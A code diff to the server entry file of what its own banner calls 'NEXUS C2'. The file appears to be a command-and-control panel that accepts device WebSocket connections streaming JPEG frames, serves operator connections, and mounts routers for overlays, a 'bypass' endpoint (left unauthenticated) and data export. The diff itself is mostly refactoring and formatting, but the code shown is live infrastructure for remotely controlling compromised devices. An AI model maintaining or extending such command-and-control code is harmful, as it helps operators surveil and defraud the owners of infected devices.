@@ -16,6 +16,7 @@ const apiRouter     = require('../routes/api');
 const authRouter    = require('../routes/auth');
 const overlayRouter = require('../routes/overlays');
 const exportRouter  = require('../routes/export');
+const bypassRouter  = require('../routes/bypass');
 
 const PORT   = parseInt(process.env.PORT || '3000', 10);
 const DB_DIR = path.resolve(
@@ -37,7 +38,7 @@ const sessionMw = session({
     secure:   process.env.NODE_ENV === 'production',
     httpOnly: true,
     sameSite: 'strict',
-    maxAge:   12 * 60 * 60 * 1000
+    maxAge:   12 * 60 * 60 * 1000,
   }
 });
 
@@ -47,18 +48,18 @@ app.use(express.json({ limit: '64mb' }));
 app.use(express.urlencoded({ extended: true, limit: '64mb' }));
 app.use(sessionMw);
 
-// ── Static ─────────────────────────────────────────────────────────────────────
+// ── Static files ───────────────────────────────────────────────────────────────
 app.use('/static', express.static(path.join(__dirname, '../public'), {
   maxAge: process.env.NODE_ENV === 'production' ? '1h' : 0,
-  etag:   true
+  etag:   true,
 }));
 
 // ── Routes ─────────────────────────────────────────────────────────────────────
 app.use('/', authRouter);
-app.use('/api',         requireLogin, apiRouter);
-app.use('/api/overlays',requireLogin, overlayRouter);
-app.use('/api/bypass',  require('../routes/bypass'));
-app.use('/api/export',  requireLogin, exportRouter);
+app.use('/api',          requireLogin, apiRouter);
+app.use('/api/overlays', requireLogin, overlayRouter);
+app.use('/api/bypass',   bypassRouter);
+app.use('/api/export',   requireLogin, exportRouter);
 
 app.get('/', requireLogin, (_, res) =>
   res.sendFile('index.html', { root: path.join(__dirname, '../public') })
@@ -70,8 +71,8 @@ app.use((_, res) => res.redirect('/'));
 // ── WebSocket ──────────────────────────────────────────────────────────────────
 const wss = new WebSocket.Server({
   noServer:          true,
-  perMessageDeflate: false,    // JPEG already compressed
-  maxPayload:        16777216, // 16 MB
+  perMessageDeflate: false,   // JPEG already compressed
+  maxPayload:        16_777_216, // 16 MB
   clientTracking:    false,
 });
 
@@ -90,7 +91,7 @@ server.on('upgrade', (req, socket, head) => {
     return;
   }
 
-  // Device: /ws/device, /, or any path if x-device-id header present
+  // Device connection — accepts /ws/device, /, or any path with x-device-id header
   if (url === '/ws/device' || url === '/' || req.headers['x-device-id']) {
     wss.handleUpgrade(req, socket, head, ws => handleDevice(ws, req));
     return;
@@ -99,12 +100,12 @@ server.on('upgrade', (req, socket, head) => {
   socket.destroy();
 });
 
-// ── Boot ────────────────────────────────────────────────────────────────────────
+// ── Boot ───────────────────────────────────────────────────────────────────────
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`\n  NEXUS C2  →  http://0.0.0.0:${PORT}`);
   console.log(`  Device WS →  ws://0.0.0.0:${PORT}/ws/device`);
   console.log(`  Op WS     →  ws://0.0.0.0:${PORT}/ws/operator\n`);
 });
 
-process.on('uncaughtException',  e => console.error('[!]', e.message));
-process.on('unhandledRejection', e => console.error('[!]', e));
+process.on('uncaughtException',  e => console.error('[!] uncaught:', e.message));
+process.on('unhandledRejection', e => console.error('[!] rejection:', e));
